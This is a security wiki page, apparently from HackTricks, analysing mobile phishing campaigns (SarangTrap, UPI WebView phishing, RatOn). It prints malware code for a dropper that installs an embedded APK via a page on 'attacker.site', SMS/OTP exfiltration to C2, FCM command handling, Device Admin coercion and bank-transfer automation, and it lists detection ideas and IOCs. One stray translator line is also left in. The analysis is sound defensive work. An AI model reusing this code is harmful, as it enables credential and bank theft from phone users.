# Phishing Móvel & Distribuição de Apps Maliciosos (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cobre técnicas usadas por atores de ameaça para distribuir **APKs Android maliciosos** e **iOS mobile-configuration profiles** através de phishing (SEO, engenharia social, lojas falsas, apps de namoro, etc.).
> O material é adaptado da campanha SarangTrap exposta pela Zimperium zLabs (2025) e outras pesquisas públicas.

## Fluxo de Ataque

1. **Infraestrutura de SEO/Phishing**
* Registrar dezenas de domínios parecidos (sites de namoro, compartilhamento em nuvem, serviço de carro…).
– Usar palavras-chave no idioma local e emojis no elemento `<title>` para ranquear no Google.
– Hospedar *ambas* as instruções de instalação para Android (`.apk`) e iOS na mesma landing page.
2. **Download da Primeira Fase**
* Android: link direto para um APK *não assinado* ou de “loja de terceiros”.
* iOS: `itms-services://` ou link HTTPS simples para um perfil **mobileconfig** malicioso (ver abaixo).
3. **Engenharia social pós-instalação**
* Na primeira execução o app pede um **código de convite / verificação** (ilusão de acesso exclusivo).
* O código é **POSTado via HTTP** para o Command-and-Control (C2).
* C2 responde `{"success":true}` ➜ o malware continua.
* Análises dinâmicas em sandbox/AV que nunca submetem um código válido não veem **comportamento malicioso** (evasão).
4. **Abuso de Permissões em Tempo de Execução (Android)**
* Permissões perigosas são solicitadas apenas **após resposta positiva do C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Variantes recentes **removem `<uses-permission>` para SMS do `AndroidManifest.xml`** mas deixam o caminho de código Java/Kotlin que lê SMS através de reflection ⇒ reduz a pontuação estática enquanto ainda funciona em dispositivos que concedem a permissão via `AppOps` abuse ou alvos antigos.
5. **Interface de fachada & coleta em segundo plano**
* O app mostra telas inofensivas (visualizador de SMS, seletor de galeria) implementadas localmente.
* Enquanto isso exfiltra:
- IMEI / IMSI, número de telefone
- Dump completo de `ContactsContract` (array JSON)
- JPEG/PNG de `/sdcard/DCIM` comprimidos com [Luban](https://github.com/Curzibn/Luban) para reduzir o tamanho
- Conteúdo SMS opcional (`content://sms`)
Payloads são **zipados em lote** e enviados via `HTTP POST /upload.php`.
6. **Técnica de entrega iOS**
* Um único **mobile-configuration profile** pode requisitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. para inscrever o dispositivo em uma supervisão similar a “MDM”.
* Instruções de engenharia social:
1. Abra Settings ➜ *Profile downloaded*.
2. Toque em *Install* três vezes (screenshots na página de phishing).
3. Confie no perfil não assinado ➜ atacante ganha entitlement de *Contacts* & *Photo* sem revisão da App Store.
7. **Camada de Rede**
* HTTP simples, frequentemente na porta 80 com HOST header como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sem TLS → fácil de identificar).

## Testes Defensivos / Dicas para Red-Team

* **Bypass de Análise Dinâmica** – Durante avaliação de malware, automatize a fase do código de convite com Frida/Objection para alcançar a ramificação maliciosa.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` com runtime `PackageManager#getRequestedPermissions()`; permissões perigosas ausentes são um sinal de alerta.
* **Canário de Rede** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` para detectar rajadas suspeitas de POST após a entrada do código.
* **Inspeção de mobileconfig** – Use `security cms -D -i profile.mobileconfig` no macOS para listar `PayloadContent` e identificar entitlements excessivos.

## Ideias de Detecção para Blue Team

* **Certificate Transparency / DNS Analytics** para detectar surtos súbitos de domínios ricos em keywords.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` de clientes Dalvik fora do Google Play.
* **Telemetria de código de convite** – POSTs de códigos numéricos de 6–8 dígitos logo após a instalação do APK podem indicar estágio.
* **Assinatura de MobileConfig** – Bloquear perfis de configuração não assinados via política MDM.

## Exemplo útil de Frida: Auto-Bypass do código de convite
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Padrão Dropper + FCM C2

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Cadeia de entrega através de plataformas confiáveis
- Isca por vídeo no YouTube → a descrição contém um link curto
- Link curto → site de phishing no GitHub Pages imitando o portal legítimo
- O mesmo repositório GitHub hospeda um APK com um selo falso “Google Play” que aponta diretamente para o arquivo
- Páginas de phishing dinâmicas hospedadas no Replit; o canal de comando remoto usa Firebase Cloud Messaging (FCM)

### Dropper com embedded payload e instalação offline
- O primeiro APK é um instalador (dropper) que inclui o malware real em `assets/app.apk` e solicita que o usuário desative Wi‑Fi/dados móveis para reduzir a detecção em nuvem.
- O embedded payload instala-se sob um rótulo inofensivo (por exemplo, “Secure Update”). Após a instalação, tanto o instalador quanto o payload estão presentes como apps separados.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Descoberta dinâmica de endpoints via shortlink
- Malware obtém uma lista em texto simples, separada por vírgulas, de endpoints ativos a partir de um shortlink; transformações simples de string produzem o caminho final da página de phishing.

Exemplo (sanitizado):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocódigo:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Coleta de credenciais UPI baseada em WebView
- A etapa “Make payment of ₹1 / UPI‑Lite” carrega um formulário HTML do atacante a partir do endpoint dinâmico dentro de um WebView e captura campos sensíveis (telefone, banco, UPI PIN) que são `POST`ados para `addup.php`.

Loader mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Permissões agressivas são solicitadas na primeira execução:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Contatos são percorridos para enviar smishing SMS em massa a partir do dispositivo da vítima.
- SMS recebidos são interceptados por um broadcast receiver e enviados com metadados (remetente, corpo, slot do SIM, ID aleatório por dispositivo) para `/addsm.php`.

Esboço do receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- O payload registra-se no FCM; mensagens push carregam um campo `_type` usado como um switch para acionar ações (por exemplo, atualizar modelos de texto de phishing, alternar comportamentos).

Exemplo de payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esboço do Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Padrões de hunting e IOCs
- APK contém payload secundário em `assets/app.apk`
- WebView carrega pagamento de `gate.htm` e exfiltra para `/addup.php`
- Exfiltração de SMS para `/addsm.php`
- Busca de config via shortlink (e.g., `rebrand.ly/*`) retornando endpoints CSV
- Apps rotulados como genéricos “Update/Secure Update”
- Mensagens FCM `data` com um discriminador `_type` em apps não confiáveis

### Ideias de detecção e defesa
- Marcar apps que instruem usuários a desativar a rede durante a instalação e então fazer sideload de um segundo APK de `assets/`.
- Gerar alerta sobre a tupla de permissões: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + fluxos de pagamento baseados em WebView.
- Monitoramento de egress para `POST /addup.php|/addsm.php` em hosts não corporativos; bloquear infraestrutura conhecida.
- Regras Mobile EDR: app não confiável registrando-se no FCM e ramificando com base no campo `_type`.

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – estudo de caso RatOn

A campanha RatOn banker/RAT (ThreatFabric) é um exemplo concreto de como operações modernas de mobile phishing combinam WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, e até NFC-relay orchestration. Esta seção abstrai as técnicas reutilizáveis.

### Stage-1: WebView → ponte nativa de instalação (dropper)

Os atacantes exibem um WebView apontando para uma página atacante e injetam uma JavaScript interface que expõe um native installer. Um toque em um botão HTML chama código nativo que instala um APK de segunda etapa empacotado nos assets do dropper e então o executa diretamente.

Padrão mínimo:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Por favor, cole o HTML da página que você quer que eu traduza.
```html
<button onclick="bridge.installApk()">Install</button>
```
Após a instalação, o dropper inicia o payload via package/activity explícito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: apps não confiáveis chamando `addJavascriptInterface()` e expondo métodos semelhantes a instaladores para WebView; APK distribuindo um payload secundário embutido em `assets/` e invocando o Package Installer Session API.

### Funil de consentimento: Accessibility + Device Admin + prompts de runtime subsequentes
Stage-2 abre um WebView que hospeda uma página “Access”. O botão desta invoca um método exportado que navega a vítima para as configurações de Accessibility e solicita a ativação do serviço malicioso. Uma vez concedido, o malware usa Accessibility para clicar automaticamente através dos diálogos de permissão de runtime subsequentes (contacts, overlay, manage system settings, etc.) e solicita Device Admin.

- Accessibility ajuda programaticamente a aceitar prompts posteriores encontrando botões como “Allow”/“OK” na árvore de nós e disparando cliques.
- Verificação/solicitação de permissão de overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Veja também:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Phishing por sobreposição / resgate via WebView
Operadores podem emitir comandos para:
- exibir uma sobreposição em tela cheia a partir de uma URL, ou
- passar HTML inline que é carregado em uma sobreposição WebView.

Usos prováveis: coerção (inserção do PIN), abertura de wallet para capturar PINs, envio de mensagens de resgate. Mantenha um comando para garantir que a permissão de sobreposição esteja concedida se estiver ausente.

### Modelo de controle remoto – pseudo-tela de texto + screen-cast
- Baixa largura de banda: despejar periodicamente a árvore de nodes do Accessibility, serializar textos visíveis/roles/bounds e enviar para o C2 como uma pseudo-tela (comandos como `txt_screen` uma vez e `screen_live` contínuo).
- Alta fidelidade: solicitar MediaProjection e iniciar screen-casting/gravação sob demanda (comandos como `display` / `record`).

### ATS playbook (automação de apps bancários)
Dada uma tarefa JSON, abrir o app do banco, controlar a UI via Accessibility com uma mistura de consultas por texto e toques por coordenadas, e inserir o PIN de pagamento da vítima quando solicitado.

Exemplo de tarefa:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Exemplos de textos vistos em um fluxo alvo (CZ → EN):
- "Nová platba" → "Novo pagamento"
- "Zadat platbu" → "Inserir pagamento"
- "Nový příjemce" → "Novo destinatário"
- "Domácí číslo účtu" → "Número de conta doméstica"
- "Další" → "Próximo"
- "Odeslat" → "Enviar"
- "Ano, pokračovat" → "Sim, continuar"
- "Zaplatit" → "Pagar"
- "Hotovo" → "Concluído"

Operadores também podem verificar/aumentar os limites de transferência por meio de comandos como `check_limit` e `limit` que navegam na UI de limites de forma semelhante.

### Crypto wallet seed extraction
Alvos como MetaMask, Trust Wallet, Blockchain.com, Phantom. Fluxo: desbloquear (PIN roubado ou senha fornecida), navegar até Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implementar locale-aware selectors (EN/RU/CZ/SK) para estabilizar a navegação entre idiomas.

### Device Admin coercion
Device Admin APIs são usadas para aumentar as oportunidades de PIN-capture e frustrar a vítima:

- Bloqueio imediato:
```java
dpm.lockNow();
```
- Expirar a credencial atual para forçar a alteração (Accessibility captura novo PIN/senha):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forçar desbloqueio não biométrico desativando recursos biométricos do keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Muitos controles do DevicePolicyManager exigem Device Owner/Profile Owner em versões recentes do Android; algumas builds de OEM podem ser permissivas. Sempre valide no SO/OEM alvo.

### Orquestração de relay NFC (NFSkate)
Stage-3 pode instalar e iniciar um módulo externo de NFC-relay (por exemplo, NFSkate) e até fornecer um template HTML para guiar a vítima durante o relay. Isso permite cash-out contactless card-present juntamente com ATS online.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Conjunto de comandos do operador (exemplo)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Ideias de detecção e defesa (estilo RatOn)
- Procurar por WebViews com `addJavascriptInterface()` expondo métodos de instalador/permissão; páginas terminando em “/access” que acionam prompts de Accessibility.
- Alertar sobre apps que geram gestos/cliques de Accessibility em alta taxa logo após receberem acesso ao serviço; telemetria que se assemelha a dumps de nodes de Accessibility enviados ao C2.
- Monitorar mudanças de policy do Device Admin em apps não confiáveis: `lockNow`, expiração de senha, alternâncias de recursos do keyguard.
- Alertar sobre prompts de MediaProjection de apps não corporativos seguidos por uploads periódicos de frames.
- Detectar instalação/lançamento de um app NFC-relay externo acionado por outro app.
- Para serviços bancários: impor confirmações out-of-band, vinculação biométrica e limites de transação resistentes à automação no dispositivo.

## Referências

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
